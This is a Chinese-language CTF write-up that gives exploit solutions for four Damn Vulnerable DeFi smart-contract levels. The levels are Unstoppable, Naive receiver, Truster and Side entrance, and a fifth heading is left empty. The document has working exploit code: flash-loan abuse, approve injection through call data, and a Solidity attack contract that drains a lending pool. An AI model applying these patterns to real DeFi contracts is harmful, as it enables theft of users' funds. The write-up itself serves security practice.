### 1.unstoppable
根据题目，即为攻击合约让他停止工作，在flashLoan函数里面有一句assert(poolBalance == balancebefore),所以让两者不相等即可 

方法即为：transfer 1 ether给合约 

攻击代码： 

 it('Exploit', async function () { 
 
     /** COOD YOUR EXPLOIT HIRE */ 
     
     await this.token.transfer(this.pool.address,1); 
     
 }); 
 
 ### 2.Naive receiver 
 
 题目要求：抽空用户合约里的所有eth 
 
 flashLoan函数以borrower借款 
 
 攻击代码： 
 
  it('Exploit', async function () { 
  
     /** COOD YOUR EXPLOIT HIRE */ 
     
     for(i=0;i<10;i++){ 
     
     await this.pool.flashLoan(this.receiver.address,0); 
     
     } 
     
  });  

  ### 3.Truster
  ##### call注入，data里调用approve给攻击者地址授权，然后再用transferfrom将钱转过来
```
  it('Exploit', async function () {
    const data = web3.eth.abi.encodeFunctionCall({
        name: 'approve',
        type: 'function',
        inputs: [{
            type: 'address',
            name: 'spender'
        },{
            type: 'uint256',
            name: 'amount'
        }]
    }, [attacker, TOKENS_IN_POOL.toString()]); 

    await this.pool.flashLoan(0, attacker, this.token.address, data);
    await this.token.transferFrom(this.pool.address, attacker, TOKENS_IN_POOL, { from: attacker });
});
```
### 4. Side entrance
从贷款池中借出一定量的 ETH 并通过 deposit() 函数将这部分 ETH 存入，那么在满足 address(this).balance >= balanceBefore 的同时，balances[msg.sender] 也会增加。然后我们再通过 withdraw() 函数取出，即可顺利提空贷款池中的内部金额
```
interface IFlashLoanEtherReceiver {
    function execute() external payable;
}

interface ISideEntranceLenderPool {
    function deposit() external payable;
    function withdraw() external;
    function flashLoan(uint256 amount) external;
}

contract AttackSideEntrance is IFlashLoanEtherReceiver {
    using Address for address payable;

    ISideEntranceLenderPool pool;

    function attack(ISideEntranceLenderPool _pool) public {
        pool = _pool;
        pool.flashLoan(address(_pool).balance);
        pool.withdraw();
        msg.sender.sendValue(address(this).balance);
    }

    function execute() external payable override {
        pool.deposit{value:msg.value}();
    }

    receive() external payable{}
}
const AttackSideEntrance = contract.fromArtifact('AttackSideEntrance');
// ...
it('Exploit', async function () {
    const attack = await AttackSideEntrance.new();
    await attack.attack(this.pool.address, { from: attacker });
});
```

### 5. The rewarder





  
